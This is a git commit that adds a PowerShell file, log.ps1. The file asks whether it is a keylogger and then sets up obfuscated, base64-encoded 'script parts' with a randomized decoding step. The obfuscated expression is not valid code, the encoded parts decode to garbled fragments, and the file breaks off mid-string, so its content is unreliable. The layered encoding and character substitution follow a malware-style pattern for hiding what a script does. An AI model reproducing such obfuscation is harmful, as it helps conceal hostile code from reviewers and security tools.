4b7421e419704252864b63e229158dc3798ab31e
Matthew S <matts0613@users.noreply.github.com>
2024-04-16 18:57:19 -0400

    Update log.ps1

---
+++ log.ps1
@@ -0,0 +1,11 @@
+Is this script a keylogger? 
+
+# Obfuscated function to restore 's'
+${'(aq+`z`+`(av+`t+`(av+`q+`a+`z+`(aq+`q+`(aq+`z`+`(aq+`q+`aq+`z+`(aq+`z+`(aq+`z`+`(aq+`q+`a+`z`+`(av+`q+`(av+`a+`z+`aq+`(av+`q+`(av+`a+`z+`aq+`aq+`z`+`aq+`z`+`(aq+`z`+`(aq+`q+`(av+`a+`z`+`aq+`(av+`q+`(av+`a+`z`+`aq+`aq+`z`+`aq+`z`+`av+`a+`z`+`av+`q+`av+`q+`aq+`aq+`z`+`av+`a+`z`+`av+`q+`aq+`z`+`aq+`z`+`(aq+`z`+`(aq+`z`+`(aq+`q+`a+`z`+`av+`q+`aq+`z`+`aq+`aq+`(av+`a+`z`+`aq+`av+`a+`z`+`aq+`aq+`z`+`aq+`z`+`av+`a+`z`+`av+`q+`av+`q+`aq+`aq+`z`+`av+`a+`z`+`av+`q+`aq+`z`+`aq+`z`+`aq+`z`+`aq+`(aq+`z`+`aq+`z`+`(aq+`q+`a+`z`+`av+`q+`(av+`a+`z`+`aq+`(av+`q+`(av+`a+`z`+`aq+`aq+`z`+`aq+`z`+`(aq+`z`+`(aq+`q+`(av+`a+`z`+`aq+`(av+`q+`(av+`a+`z`+`(av+`q+`aq+`z`+`(av+`a+`z`+`aq+`aq+`z`+`aq+`(aq+`z`+`(aq+`q+`a+`z`+`av+`(aq+`z`+`(aq+`q+`a+`z`+`av+`aq+`z`+`aq+`(aq+`z`+`aq+`aq+`z`+`aq+`z`+`av+`a+`z`+`av+`q+`av+`q+`aq+`aq+`z`+`av+`a+`z`+`av+`q+`aq+`z`+`aq+`z`+`aq+`z`+`aq+`(aq+`z`+`aq+`z`+`(aq+`z`+`av+`q+`aq+`z`+`aq+`aq+`(av+`a+`z`+`aq+`av+`a+`z`+`aq+`aq+`z`+`aq+`z`+`av+`a+`z`+`av+`q+`av+`q+`aq+`aq+`z`+`av+`a+`z`+`av+`q+`aq+`z`+`aq+`z`+`aq+`z`+`aq+`z`+`aq+`z`+`av+`a+`z`+`av+`q+`av+`q+`aq+`aq+`z`+`av+`a+`z`+`av+`"))
+
+# Generate a random number to determine the encoding method
+$randomNumber = Get-Random -Minimum 1 -Maximum 3
+
+# Define the script parts with 's' replaced with 'Z'
+$scriptPart1 = "IyMgQ29udmVydCBhIGhhYmJpdCB0YXJnZXQgdG8gY2hhcmFjdGVycwoZWFyZXIgaXMgZGVjb2RlZA=="
+$scriptPart2 = "ZW5jb2RlZFN0cm9uZyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ10uQVNDSU5HX1N0cm9u
